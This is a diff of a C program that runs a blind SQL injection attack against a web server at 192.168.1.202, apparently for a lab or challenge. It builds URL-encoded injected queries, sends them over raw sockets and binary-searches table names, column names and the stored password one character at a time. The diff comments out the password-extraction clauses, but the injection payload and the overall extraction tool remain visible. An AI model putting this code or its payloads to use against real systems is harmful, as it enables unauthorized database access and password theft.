@@ -281,12 +281,13 @@ bool check_password(const void *ctx) {
         "%%60%s%%60" // FROM `table_name`
         "%%20WHERE%%20"
         "%%60%s%%60" // WHERE `id_col`
-        "%%3d%%27322695107%%27%%20AND%%20"
-        "%%60%s%%60" // AND `pwd_col`...
-        "%%20LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
-        "AND%%20ASCII(SUBSTR("
-        "%%60%s%%60" // SUBSTR(`pwd_col`...)
-        ",%i,1))<%%3dASCII(%%27%s%%27)%%20"
+        "%%3d%%27322695107%%27%%20"
+        //"AND%%20"
+        //"%%60%s%%60%%20" // AND `pwd_col`...
+        //"LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
+        //"AND%%20ASCII(SUBSTR("
+        //"%%60%s%%60" // SUBSTR(`pwd_col`...)
+        //",%i,1))<%%3dASCII(%%27%s%%27)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
@@ -296,12 +297,12 @@ bool check_password(const void *ctx) {
     sprintf(mal_req, fmt,
         d_ctx->pwd_col,
         d_ctx->table_name,
-        d_ctx->id_col,
-        d_ctx->pwd_col,
+        d_ctx->id_col
+        /*d_ctx->pwd_col,
         d_ctx->gen_ctx.discovered,
         d_ctx->pwd_col,
         d_ctx->gen_ctx.index + 1,
-        d_ctx->gen_ctx.guess
+        d_ctx->gen_ctx.guess*/
     );
     _send(d_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
     return recv_empty(d_ctx->gen_ctx.sockfd);
@@ -423,7 +424,6 @@ int32_t main() {
         printf("Found Table: %s\n", table_name);
     #endif
 
-    // 2. Find ID Column
     char id_name[31] = {0};
     {
         ColumnCtx id_ctx = {
@@ -438,7 +438,6 @@ int32_t main() {
         binary_search(check_column, &id_ctx);
     }
 
-    // 3. Find Password Column
     char pwd_name[31] = {0};
     {
         ColumnCtx pwd_col_ctx = {
@@ -453,7 +452,6 @@ int32_t main() {
         binary_search(check_column, &pwd_col_ctx);
     }
 
-    // 4. Find Actual Password Data
     char final_password[31] = {0};
     {
         PwdCtx pwd_ctx = {
